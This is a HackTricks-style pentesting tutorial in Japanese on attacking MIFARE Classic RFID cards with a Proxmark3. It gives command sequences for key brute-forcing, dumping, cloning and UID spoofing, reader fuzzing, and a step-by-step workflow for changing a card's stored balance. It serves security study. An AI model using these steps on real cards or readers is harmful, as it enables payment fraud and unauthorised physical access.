# Proxmark 3

{{#include ../../banners/hacktricks-training.md}}

## Proxmark3を使ったRFIDシステムへの攻撃

積極的にメンテナンスされているRRG/Iceman Proxmark3 clientと対応するfirmwareをインストールし、以下に示す古いコマンドは変更されている場合があるため、そのビルドでコマンド構文を確認してください。<sup>[[1]](#references)[[5]](#references)</sup>

### MIFARE Classic 1KBへの攻撃

MIFARE Classic 1Kには、**16セクター**があり、各セクターは**16バイトのブロック**を**4つ**備えています。Manufacturer block 0にはUIDとメーカー情報が格納されており、正規のNXPカードでは読み取り専用です。特殊なクローンカードや「magic」カードでは、書き換えが可能な場合があります。<sup>[[1]](#references)[[2]](#references)</sup>\
各セクターにアクセスするには、**2つのキー**（**A**と**B**）が必要です。これらのキーは、各セクターの**block 3**（sector trailer）に格納されています。sector trailerには、2つのキーを使って**各ブロックの読み取りと書き込み**の権限を定める**access bits**も格納されています。\
たとえば、1つ目のキーがわかれば読み取り、2つ目のキーがわかれば書き込みの権限を与えるために、2つのキーを使い分けられます。

いくつかの攻撃を実行できます

```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```

Proxmark3では、機密データの特定を試みるために、**TagからReaderへの通信**を**盗聴**するなど、ほかの操作も実行できます。このカードでは、通信をスニッフィングして使用された鍵を計算できます。これは、使用されている**暗号処理が脆弱**であり、平文と暗号文が分かれば鍵を計算できるためです（`mfkey64`ツール）。<sup>[[3]](#references)</sup>

#### 保存価値の不正利用に向けたMiFare Classicの簡易ワークフロー

端末がClassicカードに残高を保存する場合、一般的なエンドツーエンドの流れは次のとおりです。<sup>[[4]](#references)</sup>

```bash
# 1) Recover sector keys and dump full card
proxmark3> hf mf autopwn

# 2) Modify dump offline (adjust balance + integrity bytes)
#    Use diffing of before/after top-up dumps to locate fields

# 3) Write modified dump to a UID-changeable ("Chinese magic") tag
proxmark3> hf mf cload -f modified.bin

# 4) Clone original UID so readers recognize the card
proxmark3> hf mf csetuid -u <original_uid>
```

Notes

- `hf mf autopwn` orchestrates nested/darkside/HardNested-style attacks, recovers keys, and creates dumps in the client dumps folder.<sup>[[1]](#references)</sup>
- block 0/UIDへの書き込みはmagic gen1a/gen2カードでのみ可能です。通常のClassicカードのUIDは読み取り専用です。<sup>[[2]](#references)</sup>
- 多くの導入環境ではClassicの「value blocks」や単純なチェックサムが使われています。編集後は、複製されたフィールドや補数フィールド、チェックサムに矛盾がないことを確認してください。<sup>[[4]](#references)</sup>

より上位の手法と緩和策については、以下を参照してください。

{{#ref}}
pentesting-rfid.md
{{#endref}}

### 生コマンド

IoTシステムでは、**ブランド名のない、または市販品ではないタグ**が使われることがあります。その場合、Proxmark3を使って**タグにカスタムの生コマンドを送信**できます。

```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
  proprietary non iso14443-4 card found, RATS not supported
  No chinese magic backdoor command detected
  Prng detection: WEAK
  Valid ISO14443A Tag Found - Quitting Search
```

この情報を使って、カードに関する情報やカードとの通信方法を調べることができます。Proxmark3では、次のようなrawコマンドを送信できます: `hf 14a raw -p -b 7 26`

### スクリプト

Proxmark3ソフトウェアには、簡単なタスクを実行するために使える**自動化スクリプト**があらかじめ用意されています。一覧を取得するには、`script list`コマンドを使います。次に、`script run`コマンドに続けてスクリプト名を指定します:

```
proxmark3> script run mfkeys
```

タグリーダーを**fuzz**するスクリプトを作成できます。**有効なカード**のデータをコピーし、**Lua script**でランダムな**bytes**を1つ以上ランダム化して、各反復で**reader**がクラッシュするか確認するだけです。

## References

- [1] [Proxmark3 wiki: HF MIFARE](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Mifare)
- [2] [Proxmark3 wiki: HF Magic cards](https://github.com/RfidResearchGroup/proxmark3/wiki/HF-Magic-cards)
- [3] [NXP statement on MIFARE Classic Crypto1](https://www.mifare.net/en/products/chip-card-ics/mifare-classic/security-statement-on-crypto1-implementations/)
- [4] [NFC card vulnerability exploitation in KioSoft Stored Value (SEC Consult)](https://sec-consult.com/vulnerability-lab/advisory/nfc-card-vulnerability-exploitation-leading-to-free-top-up-kiosoft-payment-solution/)
- [5] [RRG/Iceman Proxmark3 — Linux installation](https://github.com/RfidResearchGroup/proxmark3/blob/master/doc/md/Installation_Instructions/Linux-Installation-Instructions.md)
{{#include ../../banners/hacktricks-training.md}}
